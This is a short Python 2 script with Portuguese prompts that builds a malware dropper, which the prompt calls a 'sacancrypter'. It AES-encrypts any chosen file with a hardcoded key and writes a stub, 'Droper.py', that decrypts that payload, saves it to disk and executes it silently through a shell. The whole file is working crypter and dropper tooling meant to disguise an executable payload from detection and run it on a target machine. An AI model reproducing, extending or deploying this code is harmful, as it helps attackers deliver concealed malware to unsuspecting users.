import pyaes
import binascii
#open
file_name = raw_input("Digite o nome ou Diretorio que o arquivo esta:\n")
new_file_name=raw_input("Digite o Nome Do Arquivo que vai dropa o sacancrypter:\n")
file = open(file_name, 'rb')
file_data = file.read()
file.close()
file_data_hex= binascii.hexlify(file_data)

# crypt file data
key = "1234567890abcdef" #16 bytes
aes=pyaes.AESModeOfOperationCTR(key)
crypto_data= aes.encrypt(file_data)
crypto_data_hex= binascii.hexlify(crypto_data)

stub="import pyaes,binascii,subprocess\n"
stub+="crypto_data_hex =\"" + crypto_data_hex + "\"\n"
stub+="key=\"" + key + "\"\n"
stub+="new_file_name=\"" + new_file_name + "\"\n"
stub+= """#decrypt
key = "1234567890abcdef" #16 bytes
aes=pyaes.AESModeOfOperationCTR(key)
crypto_data = crypto_data_hex.decode('hex')
decrypt_data=aes.decrypt (crypto_data)
#save"""
stub+= "new_file_name=\"" + new_file_name + "\"\n"
stub+="""
new_file= open(new_file_name, 'wb')
new_file.write(decrypt_data)
new_file.close()
proc=subprocess.Popen(new_file_name,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)"""

#save stub
name="Droper.py"
stub_file= open(name, 'w')
stub_file.write(stub)
stub_file.close()
